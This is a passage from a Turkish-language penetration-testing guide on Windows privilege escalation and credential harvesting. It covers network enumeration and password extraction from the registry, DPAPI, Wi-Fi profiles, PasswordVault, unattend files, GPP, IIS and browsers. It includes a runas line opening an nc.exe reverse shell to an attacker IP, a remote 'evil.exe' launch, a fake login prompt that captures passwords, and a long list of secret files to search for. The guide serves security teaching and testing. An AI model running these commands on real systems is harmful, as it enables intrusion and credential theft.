net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts file içinde sabit kodlanmış diğer bilinen bilgisayarları kontrol edin
```
type C:\Windows\System32\drivers\etc\hosts
```
### Ağ Arayüzleri ve DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Açık Portlar

Dışarıdan **kısıtlanmış hizmetleri** kontrol edin
```bash
netstat -ano #Opened ports?
```
### Yönlendirme Tablosu
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP Tablosu
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Güvenlik Duvarı Kuralları

[**Güvenlik Duvarı ile ilgili komutlar için bu sayfayı kontrol edin**](../basic-cmd-for-pentesters.md#firewall) **(kuralları listeleme, kural oluşturma, devre dışı bırakma, devre dışı bırakma...)**

[Ağ numaralandırması için daha fazla komut burada](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
`bash.exe` binary dosyası ayrıca `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` konumunda da bulunabilir.

root user elde ederseniz herhangi bir portu dinleyebilirsiniz (`nc.exe` ile ilk kez bir portu dinlediğinizde, GUI üzerinden `nc` uygulamasına firewall tarafından izin verilip verilmeyeceği sorulur).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Bash'i root olarak kolayca başlatmak için `--default-user root` seçeneğini deneyebilirsiniz.

`WSL` dosya sistemini `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` klasöründe inceleyebilirsiniz.

## Windows Credentials

### Winlogon Credentials
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credential Manager / Windows Vault

[https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup> adresinden\
Windows Vault, **Windows**'ın **kullanıcıları otomatik olarak oturum açtırmak** için kullanabileceği sunuculara, web sitelerine ve diğer programlara ait kullanıcı kimlik bilgilerini depolar. İlk bakışta bu, kullanıcıların Facebook, Twitter veya Gmail gibi sitelere ait kimlik bilgilerini depolayabileceği ve tarayıcıların otomatik olarak oturum açabileceği anlamına geliyor gibi görünebilir; ancak çalışma şekli bu değildir.

Windows Vault, Windows'ın kullanıcıları otomatik olarak oturum açtırabileceği kimlik bilgilerini depolar. Bu, **bir kaynağa erişmek için kimlik bilgilerine ihtiyaç duyan herhangi bir Windows uygulamasının** bu Credential Manager ve Windows Vault özelliğinden **yararlanabileceği** ve kullanıcıların her seferinde kullanıcı adı ile parolayı girmesi yerine sağlanan kimlik bilgilerini kullanabileceği anlamına gelir.

Uygulamalar Credential Manager ile etkileşime girmediği sürece, belirli bir kaynağa ait kimlik bilgilerini kullanmalarının mümkün olduğunu düşünmüyorum. Bu nedenle uygulamanız vault özelliğinden yararlanmak istiyorsa, varsayılan depolama vault'undan bu kaynağa ait kimlik bilgilerini istemek için bir şekilde **credential manager ile iletişim kurmalıdır**.

Makinede depolanan kimlik bilgilerini listelemek için `cmdkey` kullanın.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Ardından, kayıtlı kimlik bilgilerini kullanmak için `runas` komutunu `/savecred` seçenekleriyle kullanabilirsiniz. Aşağıdaki örnek, bir SMB share üzerinden uzak bir binary dosyayı çağırmaktadır.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Sağlanan kimlik bilgileriyle `runas` kullanma.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) veya [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) üzerinden.

### UWP PasswordVault / Credential Locker

Modern Windows UWP uygulamaları, Microsoft Edge ve modern sistem servisleri, kimlik doğrulama token'larını ve plaintext parolaları Universal Windows Platform (UWP) `PasswordVault` içinde depolar (`vaultcmd` içinde `Web Credentials` olarak da gösterilir). Bu depolama alanı session-isolated durumdadır ve yönetici veya `SeDebugPrivilege` hakları olmadan native olarak decrypt edilebilir.

Depolanan tüm kullanıcı adlarını ve plaintext parolaları anında dump edip decrypt etmek için bu PowerShell komutunu kullanıcının aktif session'ı içinde çalıştırın:
```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```
### DPAPI

**Data Protection API (DPAPI)**, verilerin simetrik şifrelenmesi için bir yöntem sağlar ve ağırlıklı olarak Windows işletim sistemi içinde asimetrik özel anahtarların simetrik şifrelenmesinde kullanılır. Bu şifreleme, entropiye önemli ölçüde katkıda bulunmak için bir kullanıcı veya sistem sırrından yararlanır.

**DPAPI, anahtarların kullanıcının oturum açma sırlarından türetilen bir simetrik anahtar aracılığıyla şifrelenmesini sağlar**. Sistem şifrelemesi söz konusu olduğunda, sistemin etki alanı kimlik doğrulama sırlarını kullanır.

DPAPI kullanılarak şifrelenen kullanıcı RSA anahtarları, `{SID}` kullanıcının [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) değerini temsil etmek üzere `%APPDATA%\Microsoft\Protect\{SID}` dizininde depolanır. **Aynı dosyada kullanıcının özel anahtarlarını koruyan master key ile birlikte bulunan DPAPI anahtarı**, genellikle 64 bayt rastgele veriden oluşur. (Bu dizine erişimin kısıtlı olduğunu ve içeriğinin CMD'deki `dir` komutuyla listelenemediğini, ancak PowerShell üzerinden listelenebildiğini unutmayın.)
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Uygun argümanlarla (`/pvk` veya `/rpc`) şifresini çözmek için **mimikatz module** `dpapi::masterkey` kullanabilirsiniz.

**master password** ile korunan **credentials files** genellikle şu konumlarda bulunur:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Uygun `/masterkey` ile şifrelemeyi çözmek için **mimikatz module** `dpapi::cred` kullanabilirsiniz.\
**Root** iseniz, `sekurlsa::dpapi` module ile **memory** üzerinden birçok **DPAPI** **masterkey** çıkarabilirsiniz.


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials**, şifrelenmiş kimlik bilgilerini pratik bir şekilde depolamak için genellikle **scripting** ve otomasyon görevlerinde kullanılır. Kimlik bilgileri **DPAPI** kullanılarak korunur; bu da genellikle yalnızca oluşturuldukları bilgisayarda aynı kullanıcı tarafından şifrelerinin çözülebileceği anlamına gelir.

Bir PS credentials içeren dosyadaki kimlik bilgilerinin şifresini çözmek için şunları yapabilirsiniz:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wi-Fi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Kaydedilmiş RDP Bağlantıları

Bunları `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
ve `HKCU\Software\Microsoft\Terminal Server Client\Servers\` içinde bulabilirsiniz.

### Son Çalıştırılan Komutlar
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Uzak Masaüstü Kimlik Bilgisi Yöneticisi**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Uygun `/masterkey` ile Mimikatz `dpapi::rdg` module'ünü kullanarak **herhangi bir .rdg dosyasının şifresini çözün**\
Mimikatz `sekurlsa::dpapi` module'ü ile bellekten **birçok DPAPI masterkey'i çıkarabilirsiniz**

### Sticky Notes

Kullanıcılar, bunun bir database dosyası olduğunu fark etmeden Windows workstation'larında **parolaları** ve diğer bilgileri **kaydetmek** için genellikle Sticky Notes uygulamasını kullanır. Bu dosya `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` konumunda bulunur ve her zaman aranıp incelenmeye değerdir.

### AppCmd.exe

**AppCmd.exe'den parolaları kurtarmak için Administrator olmanız ve High Integrity level altında çalışmanız gerektiğini unutmayın.**\
**AppCmd.exe**, `%systemroot%\system32\inetsrv\` directory'sinde bulunur.\
Bu dosya mevcutsa bazı **credentials** yapılandırılmış ve **kurtarılabilir** olabilir.

Bu kod [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)'den çıkarılmıştır:
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` dosyasının mevcut olup olmadığını kontrol edin .\
Installers **SYSTEM ayrıcalıklarıyla çalıştırılır**, birçoğu **DLL Sideloading'e karşı savunmasızdır (bilgi kaynağı:** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Dosyalar ve Registry (Kimlik Bilgileri)

### Putty Kimlik Bilgileri
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### PuTTY SSH Host Anahtarları
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### Registry'de SSH anahtarları

SSH private key'leri `HKCU\Software\OpenSSH\Agent\Keys` registry key'i içinde saklanabilir; bu nedenle burada ilginç bir şey olup olmadığını kontrol etmelisiniz:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Bu yolun içinde herhangi bir kayıt bulursanız, bu muhtemelen kaydedilmiş bir SSH anahtarıdır. Şifrelenmiş olarak depolanır ancak [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) kullanılarak kolayca çözülebilir.\
Bu teknik hakkında daha fazla bilgi: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

`ssh-agent` service çalışmıyorsa ve açılışta otomatik olarak başlamasını istiyorsanız şunu çalıştırın:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Görünüşe göre bu teknik artık geçerli değil. Bazı ssh anahtarları oluşturmaya, bunları `ssh-add` ile eklemeye ve ssh üzerinden bir makineye giriş yapmaya çalıştım. HKCU\Software\OpenSSH\Agent\Keys kayıt defteri anahtarı mevcut değil ve procmon, asimetrik anahtar kimlik doğrulaması sırasında `dpapi.dll` kullanımını tespit etmedi.

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Bu dosyaları **metasploit** kullanarak da arayabilirsiniz: _post/windows/gather/enum_unattend_

Örnek içerik:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM ve SYSTEM yedekleri
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud Kimlik Bilgileri
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

**SiteList.xml** adlı bir dosya arayın.

### Önbelleğe Alınmış GPP Password

Daha önce, Group Policy Preferences (GPP) aracılığıyla bir makine grubuna özel local administrator hesaplarının dağıtılmasına olanak tanıyan bir özellik mevcuttu. Ancak bu yöntemde önemli security açıkları bulunuyordu. İlk olarak, SYSVOL içinde XML dosyaları olarak depolanan Group Policy Objects (GPOs), herhangi bir domain user tarafından erişilebilir durumdaydı. İkinci olarak, bu GPP'lerde bulunan ve publicly documented bir default key kullanılarak AES256 ile şifrelenen password'ler, herhangi bir authenticated user tarafından çözülebiliyordu. Bu durum ciddi bir risk oluşturuyordu; çünkü user'ların elevated privileges elde etmesine olanak sağlayabilirdi.

Bu riski azaltmak amacıyla, içinde boş olmayan bir `"cpassword"` alanı bulunan locally cached GPP dosyalarını tarayan bir function geliştirildi. Böyle bir dosya bulunduğunda function password'ü decrypt eder ve özel bir PowerShell object döndürür. Bu object, GPP ve dosyanın konumu hakkında ayrıntılar içerir; böylece bu security vulnerability'nin tespit edilmesine ve giderilmesine yardımcı olur.

`C:\ProgramData\Microsoft\Group Policy\history` veya _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista öncesinde)_ içinde şu dosyaları arayın:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword'ü decrypt etmek için:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexec kullanarak parolaları elde etme:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Kimlik bilgileri içeren web.config örneği:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN kimlik bilgileri
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Loglar
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Credentials isteyin

Kullanıcının bunları bilebileceğini düşünüyorsanız, kullanıcıdan her zaman kendi **credentials** bilgilerini veya farklı bir kullanıcının **credentials** bilgilerini girmesini isteyebilirsiniz (**credentials** bilgilerini doğrudan istemciye sormanın gerçekten **riskli** olduğunu unutmayın):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Kimlik bilgilerini içerebilecek olası dosya adları**

Geçmişte **parolaları** **açık metin** veya **Base64** biçiminde içeren bilinen dosyalar
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Önerilen tüm dosyalarda ara:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Geri Dönüşüm Kutusu'ndaki Kimlik Bilgileri

İçinde kimlik bilgileri aramak için Geri Dönüşüm Kutusu'nu da kontrol etmelisiniz.

Çeşitli programlar tarafından kaydedilen **parolaları kurtarmak** için şunu kullanabilirsiniz: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Kayıt defterinin içinde

**Kimlik bilgileri içerebilecek diğer olası kayıt defteri anahtarları**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Registry'den openssh anahtarlarını çıkarma.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Tarayıcı Geçmişi

**Chrome veya Firefox** parolalarının depolandığı db'leri kontrol etmelisiniz.\
Ayrıca tarayıcıların geçmişini, yer imlerini ve favorilerini de kontrol edin; bazı **parolalar** burada depolanmış olabilir.

Tarayıcılardan parola çıkarmak için kullanılan araçlar:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)**, farklı dillerdeki yazılım bileşenleri arasında **intercommunication** sağlayan, Windows işletim sisteminde yerleşik bir teknolojidir. Her COM bileşeni bir **class ID (CLSID)** üzerinden **identified** edilir ve her bileşen, interface ID'leri (IID'ler) ile tanımlanan bir veya daha fazla interface üzerinden işlevsellik sunar.

COM class'ları ve interface'leri sırasıyla **HKEY\CLASSES\ROOT\CLSID** ve **HKEY\CLASSES\ROOT\Interface** altında registry'de tanımlanır. Bu registry, **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** birleştirilerek **HKEY\CLASSES\ROOT** olarak oluşturulur.

Bu registry'nin CLSID'leri içinde, bir **DLL**'yi gösteren bir **default value** ve **ThreadingModel** adlı bir değer içeren alt registry **InProcServer32** bulunabilir. **ThreadingModel** değeri **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single veya Multi) ya da **Neutral** (Thread Neutral) olabilir.

![Tarayıcı Geçmişi - COM DLL Overwriting: Bu registry'nin CLSID'leri içinde, bir DLL'yi gösteren bir default value ve... değerini içeren alt registry InProcServer32 bulunabilir.](<../../images/image (729).png>)

Temel olarak, çalıştırılacak **DLL'lerden herhangi birinin üzerine yazabiliyorsanız**, bu DLL farklı bir kullanıcı tarafından çalıştırılacaksa **privilege escalation** gerçekleştirebilirsiniz.

Saldırganların persistence mekanizması olarak COM Hijacking'i nasıl kullandığını öğrenmek için bkz.:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Dosyalarda ve registry'de genel parola araması**

**Dosya içeriklerinde arama yapın**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Belirli bir dosya adıyla dosya arama**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Kayıt defterinde anahtar adlarını ve parolaları arayın**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Parolaları arayan Tools

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **bir msf** plugin'idir; bu plugin'i, kurbanın içinde kimlik bilgilerini arayan her metasploit POST module'ünü **otomatik olarak çalıştırmak** için oluşturdum.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) bu sayfada bahsedilen parolaları içeren tüm dosyaları otomatik olarak arar.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) bir sistemden parola çıkarmak için kullanılan başka bir harika tool'dur.

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) verileri açık metin olarak kaydeden çeşitli tool'ların (**PuTTY**, **WinSCP**, **FileZilla**, **SuperPuTTY** ve **RDP**) **sessions**, **usernames** ve **passwords** bilgilerini arar.
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

**SYSTEM olarak çalışan bir process'in** (`OpenProcess()`) **tam erişimle yeni bir process açtığını** hayal edin. Aynı process ayrıca **düşük ayrıcalıklara sahip, ancak ana process'in tüm açık handle'larını devralan yeni bir process oluşturur** (`CreateProcess()`).\
Ardından, **düşük ayrıcalıklı process'e tam erişiminiz varsa**, `OpenProcess()` ile oluşturulan ayrıcalıklı process'e ait **açık handle'ı alabilir** ve **bir shellcode inject edebilirsiniz**.\
**Bu zafiyetin nasıl tespit edilip exploit edileceği** hakkında daha fazla bilgi için [bu örneği okuyun](leaked-handle-exploitation.md).\
**Farklı izin seviyeleriyle devralınan process ve thread'lerin daha fazla açık handle'ını (yalnızca tam erişim değil) nasıl test edip abuse edebileceğinize dair daha kapsamlı bir açıklama** için [**bu diğer yazıyı okuyun**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

